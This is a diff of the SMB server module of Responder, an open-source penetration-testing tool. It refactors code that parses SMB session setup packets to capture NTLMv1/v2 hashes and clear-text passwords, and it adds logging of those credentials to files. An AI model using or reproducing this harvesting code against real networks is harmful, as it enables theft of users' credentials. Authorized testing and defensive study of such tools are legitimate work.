@@ -1,3 +1,19 @@
+#!/usr/bin/env python
+# This file is part of Responder
+# Original work by Laurent Gaffie - Trustwave Holdings
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import struct
 import settings
 
@@ -108,10 +124,8 @@ def ParseSMBHash(data,client):
 		print text("[SMB] NTLMv1 (SSP) Address  : %s" % client)
 		print text("[SMB] NTLMv1 (SSP) Username : %s\\%s" % (Domain, Username))
 		print text("[SMB] NTLMv1 (SSP) Hash     : %s" % SMBHash)
-
-		outfile = "./logs/SMB-NTLMSSPv1-Client-"+client+".txt"
 		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, settings.Config.NumChal)
-		WriteData(outfile, WriteHash, Username+"::"+Domain)
+		WriteData(settings.Config.SMBNTLMSSPv1Log % client, WriteHash, Username+"::"+Domain)
 
 	if NthashLen > 60:
 		SMBHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
@@ -125,56 +139,42 @@ def ParseSMBHash(data,client):
 		print text("[SMB] NTLMv2 (SSP) Address  : %s" % client)
 		print text("[SMB] NTLMv2 (SSP) Username : %s\\%s" % (Domain, Username))
 		print text("[SMB] NTLMv2 (SSP) Hash     : %s" % SMBHash)
-
-		outfile = "./logs/SMB-NTLMSSPv2-Client-"+client+".txt"
 		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, SMBHash[:32], SMBHash[32:])
-		WriteData(outfile, WriteHash, Username+"::"+Domain)
+		WriteData(settings.Config.SMBNTLMSSPv2Log % client, WriteHash, Username+"::"+Domain)
 
 # Parse SMB NTLMv1/v2
-def ParseLMNTHash(data,client):
+def ParseLMNTHash(data, client):
 
 	LMhashLen = struct.unpack('<H',data[51:53])[0]
 	NthashLen = struct.unpack('<H',data[53:55])[0]
 	Bcc = struct.unpack('<H',data[63:65])[0]
+	Username, Domain = tuple([e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]])
 
 	if NthashLen > 25:
-		FullHash = data[65+LMhashLen:65+LMhashLen+NthashLen]
-		LmHash = FullHash.encode('hex')[:32].upper()
-		NtHash = FullHash.encode('hex')[32:].upper()
-
-		pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
-		var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
-		Username, Domain = tuple(var)
+		FullHash = data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex')
+		LmHash = FullHash[:32].upper()
+		NtHash = FullHash[32:].upper()
 	
 		print text("[SMB] NTLMv2 Address  : %s" % client)
-		print text("[SMB] NTLMv2 Username : %s\\%s" % (Domain, User))
+		print text("[SMB] NTLMv2 Username : %s\\%s" % (Domain, Username))
 		print text("[SMB] NTLMv2 Hash     : %s" % NtHash)
-		
-		outfile = "./logs/SMB-NTLMv2-Client-"+client+".txt"
 		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, LmHash, NtHash)
-		WriteData(outfile, WriteHash, Username+"::"+Domain)
+		WriteData(settings.Config.SMBNTLMv2Log % client, WriteHash, Username+"::"+Domain)
 
 	if NthashLen == 24:
 		NtHash = data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()
 		LmHash = data[65:65+LMhashLen].encode('hex').upper()
 
-		pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
-		var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
-		Username, Domain = tuple(var)
-
 		print text("[SMB] NTLMv1 Address  : %s" % client)
-		print text("[SMB] NTLMv1 Username : %s\\%s" % (Domain, User))
+		print text("[SMB] NTLMv1 Username : %s\\%s" % (Domain, Username))
 		print text("[SMB] NTLMv1 Hash     : %s" % NtHash)
-
-		outfile = "./logs/SMB-NTLMv1-Client-"+client+".txt"
 		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LmHash, NtHash, settings.Config.NumChal)
-		WriteData(outfile, WriteHash, Username+"::"+Domain)
+		WriteData(settings.Config.SMBNTLMv1Log % client, WriteHash, Username+"::"+Domain)
 
-def IsNT4ClearTxt(data):
+def IsNT4ClearTxt(data, client):
 	HeadLen = 36
-	Flag2 = data[14:16]
 
-	if Flag2 == "\x03\x80":
+	if data[14:16] == "\x03\x80":
 		SmbData = data[HeadLen+14:]
 		WordCount = data[HeadLen]
 		ChainedCmdOffset = data[HeadLen+1]
@@ -186,7 +186,8 @@ def IsNT4ClearTxt(data):
 
 				Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
 				User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
-				print text("[SMB] Clear Text Credentials: %s:%s" %(User,Password))
+				print text("[SMB] Clear Text Credentials: %s:%s" % (User,Password))
+				WriteData(settings.Config.SMBClearLog % client, User+":"+Password, User+":"+Password)
 
 # SMB Server class, NTLMSSP
 class SMB1(BaseRequestHandler):
@@ -198,7 +199,6 @@ class SMB1(BaseRequestHandler):
 				self.request.settimeout(1)
 
 				if len(data) < 1:
-					print hexdump(data)
 					break
 
 				##session request 139
@@ -222,7 +222,7 @@ class SMB1(BaseRequestHandler):
 
 				##Session Setup AndX Request
 				if data[8:10] == "\x73\x00":
-					IsNT4ClearTxt(data)
+					IsNT4ClearTxt(data, self.client_address[0])
 					
 					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
 					Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge)
